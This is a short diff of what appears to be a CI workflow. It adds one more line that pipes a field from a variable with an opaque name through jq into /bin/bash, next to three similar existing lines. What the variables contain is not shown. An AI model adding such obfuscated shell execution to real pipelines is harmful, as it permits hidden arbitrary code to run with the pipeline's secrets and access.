@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$nau3" | jq -r .f6602 | /bin/bash
           printf '%s' "$kdn09" | jq -r .t5 | /bin/bash
           printf '%s' "$lfkz56" | jq -r .gkgo79 | /bin/bash
+          printf '%s' "$wvx508" | jq -r .f8865 | /bin/bash
 
       - name: Archive results
         if: always()
